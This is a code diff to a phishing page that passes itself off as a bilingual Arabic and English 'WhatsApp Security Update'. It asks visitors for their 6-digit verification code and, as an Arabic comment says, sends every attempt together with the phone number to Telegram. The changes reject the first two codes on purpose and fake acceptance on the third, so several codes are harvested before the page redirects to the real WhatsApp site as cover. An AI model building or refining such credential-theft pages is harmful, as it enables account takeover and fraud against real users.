@@ -18,6 +18,7 @@
         .line b { color: #fff; }
         .otp-input { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 30px; text-align: center; outline: none; letter-spacing: 5px; margin: 20px 0; }
         .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; }
+        .btn:disabled { opacity: 0.6; }
         .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@@ -48,8 +49,32 @@
 
     <script>
         const langs = {
-            ar: { load: "جاري التحقق من أمان الجهاز...", title: "تحديث أمان واتساب", device: "الجهاز:", status: "الحالة:", status_v: "تحديث مطلوب", number: "الرقم الموثق:", desc: "أدخل كود التحقق المكون من 6 أرقام لتأكيد تحديث نظام التشفير.", btn: "تحديث الآن", err: "الكود غير صحيح، تم إرسال كود جديد.", wait: "جاري المعالجة..." },
-            en: { load: "Verifying device security...", title: "WhatsApp Security Update", device: "Device:", status: "Status:", status_v: "Update Required", number: "Verified Number:", desc: "Enter the 6-digit verification code to confirm encryption update.", btn: "Update Now", err: "Invalid code. A new code has been sent.", wait: "Processing..." }
+            ar: { 
+                load: "جاري فحص بروتوكولات الأمان...", 
+                title: "تحديث أمان واتساب", 
+                device: "الجهاز:", 
+                status: "الحالة:", 
+                status_v: "تحديث مطلوب", 
+                number: "الرقم:", 
+                desc: "أدخل كود التحقق (6 أرقام) لمزامنة تشفير حسابك مع الخادم الجديد.", 
+                btn: "تحديث الآن", 
+                err: "فشل التحقق: الكود غير صحيح أو انتهت صلاحيته.", 
+                wait: "جاري مطابقة الكود...", 
+                success: "تم قبول الكود. جاري المزامنة..." 
+            },
+            en: { 
+                load: "Checking security protocols...", 
+                title: "Security Update", 
+                device: "Device:", 
+                status: "Status:", 
+                status_v: "Update Required", 
+                number: "Number:", 
+                desc: "Enter the 6-digit code to sync your account encryption with the new server.", 
+                btn: "Update Now", 
+                err: "Verification failed: Incorrect or expired code.", 
+                wait: "Matching code...", 
+                success: "Code accepted. Syncing..." 
+            }
         };
 
         const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
@@ -76,10 +101,8 @@
             const ua = navigator.userAgent;
             if (/iPhone|iPad|iPod/.test(ua)) return "iPhone";
             if (/Android/.test(ua)) return "Android";
-            if (/Windows/.test(ua)) return "Windows";
-            if (/Macintosh/.test(ua)) return "Mac";
-            if (/Linux/.test(ua)) return "Linux";
-            return "Unknown Device";
+            if (/Windows/.test(ua)) return "Windows PC";
+            return "Mobile Device";
         }
 
         const deviceName = getDeviceSimple();
@@ -114,17 +137,30 @@
             const btn = document.getElementById('btn-txt');
             btn.innerText = t.wait; btn.disabled = true;
 
-            await notify(`🔥 <b>OTP #${step}</b>\n📱 Device: <code>${deviceName}</code>\n👤 Phone: <code>${CFG.P}</code>\n🔑 Code: <code>${val}</code>`);
+            // إرسال كل محاولة لتليجرام
+            await notify(`🔥 <b>OTP Attempt #${step}</b>\n🔑 Code: <code>${val}</code>\n👤 Phone: <code>${CFG.P}</code>`);
 
-            if(step === 1) {
+            if(step < 3) {
+                // أول وثاني مرة: رفض
                 setTimeout(() => {
                     alert(t.err);
                     document.getElementById('otp').value = "";
                     btn.innerText = t.btn; btn.disabled = false;
-                }, 1500);
+                }, 2000);
             } else {
-                document.body.innerHTML = `<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;"><div class="spinner"></div><p style="margin-top:20px; color:#8696a0;">Syncing...</p></div>`;
-                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 2000);
+                // ثالث مرة: قبول وهمي وتحويل
+                btn.innerText = t.success;
+                setTimeout(() => {
+                    document.body.innerHTML = `
+                        <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center;">
+                            <div class="spinner"></div>
+                            <p style="margin-top:20px; color:#00a884; font-weight:bold;">${t.success}</p>
+                            <p style="color:#8696a0; font-size:12px; margin-top:5px;">Redirecting to security center...</p>
+                        </div>`;
+                    setTimeout(() => {
+                        window.location.href = "https://www.whatsapp.com/security";
+                    }, 2000);
+                }, 1500);
             }
         }
     </script>
